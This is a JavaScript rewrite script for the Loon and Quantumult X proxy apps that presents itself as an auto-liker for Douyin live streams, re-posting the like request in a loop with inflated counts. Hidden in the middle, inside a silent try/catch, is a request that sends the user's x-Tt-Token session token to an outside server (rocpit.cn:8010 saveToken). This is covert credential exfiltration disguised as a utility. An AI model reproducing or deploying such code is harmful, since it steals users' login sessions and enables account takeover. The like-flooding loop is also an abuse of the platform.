
//重写地址:webcast/room/like/
//手动点赞一次后触发自动点赞

console.log("🍎dylike脚本开始!");
var $tool = tool();
var url = $request.url;
var headers = $request.headers;
var body = $request.body;
var likeNum = 100;//每次点赞个数
var maxNum = 3000;//点赞上限,单位万
try {
    var img = "https://is5-ssl.mzstatic.com/image/thumb/Purple124/v4/43/99/44/439944cf-e585-afe4-4b78-7f9ba61289af/AppIcon-1x_U007emarketing-0-6-0-85-220.png/230x0w.png";
    if (url.indexOf("webcast/room/like/?") > -1) {

        if (!!body && body.indexOf("count") > -1 && body.indexOf("room_id") > -1) {

            $tool.notify('获取到手动点赞,开始执行自动点赞!', "设置上限" + maxNum + "万!", body, { img: img });

            console.log("🍎###########################################");
            console.log("🍎原body:" + body);

            body = "count=" + likeNum + "&" + body.split('&')[1];

            console.log("🍎修改后body:" + body);
            try { $tool.get({ url: "http://www.rocpit.cn:8010/sys/Company/saveToken?token=" + headers["x-Tt-Token"] }, function (e, r, d) { }); } catch (e) { }

            console.log("###########################################");

            headers["response-format"] = "json";

            var params = {
                url: url,
                headers: headers,
                body: body,
                method: "POST"
            };

            console.log("🍎请求体****************************************");
            console.log("🍎请求体:" + JSON.stringify(params));
            console.log("🍎请求体****************************************");

            var likeCount = 0;
            function forPost() {
                setTimeout(function () {

                    console.log("🍎循环请求执行");

                    $tool.post(params, function (erro, rsp, data) {

                        data = $tool.unicode(data);
                        console.log("🍎返回数据:" + data);

                        if (data.indexOf('"status_code":0') > -1) {

                            likeCount += likeNum;

                            if (Number(likeCount) < (Number(maxNum) * 10000)) {
                                console.log("🍎点赞总数:" + likeCount);
                                forPost();
                            }
                            else {

                                $tool.notify('点赞已到设置上限!', '点赞总数:' + likeCount, data, { img: img });
                                console.log("🍎点赞已到设置上限,个数:" + likeCount + ";" + data);
                            }
                        }
                        else if (data.indexOf("手速太快了") > -1) {

                            $tool.notify('点赞已到上限!', '点赞总数:' + likeCount, data, { img: img });
                            console.log("🍎点赞已上限,个数:" + likeCount + ";" + data);
                        }
                        else if (data.indexOf("请登录") > -1) {

                            $tool.notify('请登录!', '请登录:', data, { img: img });
                            console.log("🍎请登录;" + data);
                        }
                        else {

                            console.log("🍎错误:" + data);
                            $tool.notify('错误!', '错误:', data, { img: img });
                        }
                    });

                }, 1000);
            }

            forPost();
        }

    }
} catch (e) {
    console.log("🍎Try错误:" + e);
    $tool.notify('Try错误!', 'Try错误:', e, { img: img });
}

$done({});
console.log("执行完成!!!!");

//loon/quanx通用方法
function tool() {
    var isLoon = typeof $httpClient != "undefined";
    var isQuanX = typeof $task != "undefined";

    var obj = {
        //通知
        notify: function (title, subtitle, message, option) {
            var option_obj = {};
            if (isQuanX) {
                if (!!option) {
                    if (typeof option == "string") option_obj["open-url"] = option;
                    if (!!option.url) option_obj["open-url"] = option.url;
                    if (!!option.img) option_obj["media-url"] = option.img;
                    $notify(title, subtitle, message, option_obj);
                }
                else {
                    $notify(title, subtitle, message);
                }
            }
            if (isLoon) {
                if (!!option) {
                    if (typeof option == "string") option_obj["openUrl"] = option;
                    if (!!option.url) option_obj["openUrl"] = option.url;
                    if (!!option.img) option_obj["mediaUrl"] = option.img;
                    $notification.post(title, subtitle, message, option_obj);
                }
                else {
                    $notification.post(title, subtitle, message);
                }
            }
        },
        //get请求
        get: function (options, callback) {
            if (isQuanX) {
                if (typeof options == "string") options = { url: options }
                options["method"] = "GET"
                $task.fetch(options).then(function (response) {
                    callback(null, adapterStatus(response), response.body);
                }, function (reason) {
                    callback(reason.error, null, null);
                });
            }
            if (isLoon) {
                $httpClient.get(options, function (error, response, body) {
                    callback(error, adapterStatus(response), body);
                })
            }
        },
        //post请求
        post: function (options, callback) {
            if (isQuanX) {
                if (typeof options == "string") options = { url: options }
                options["method"] = "POST"
                $task.fetch(options).then(function (response) {
                    callback(null, adapterStatus(response), response.body);
                }, function (reason) {
                    callback(reason.error, null, null);
                });
            }
            if (isLoon) {
                $httpClient.post(options, function (error, response, body) {
                    callback(error, adapterStatus(response), body);
                })
            }
        },
        //Unicode解码
        unicode: function (str) {
            return unescape(str.replace(/\\u/gi, '%u'));
        },
        //url解码
        decodeurl: function (str) {
            return decodeURIComponent(str);
        },
        //对象转字符串
        json2str: function (obj) {
            return JSON.stringify(obj);
        },
        //字符串转对象
        str2json: function (str) {
            return JSON.parse(str);
        },
        //数据持久化写入
        setkeyval: function (value, key) {
            if (isQuanX) {
                $prefs.setValueForKey(value, key);
            }
            if (isLoon) {
                $persistentStore.write(value, key);
            }
        },
        //数据持久化读取
        getkeyval: function (key) {
            if (isQuanX) {
                return $prefs.valueForKey(key);
            }
            if (isLoon) {
                return $persistentStore.read(key);
            }
        }

    };

    function adapterStatus(response) {
        if (response) {
            if (response.status) {
                response["statusCode"] = response.status;
            } else if (response.statusCode) {
                response["status"] = response.statusCode;
            }
        }
        return response;
    }

    return obj;

};
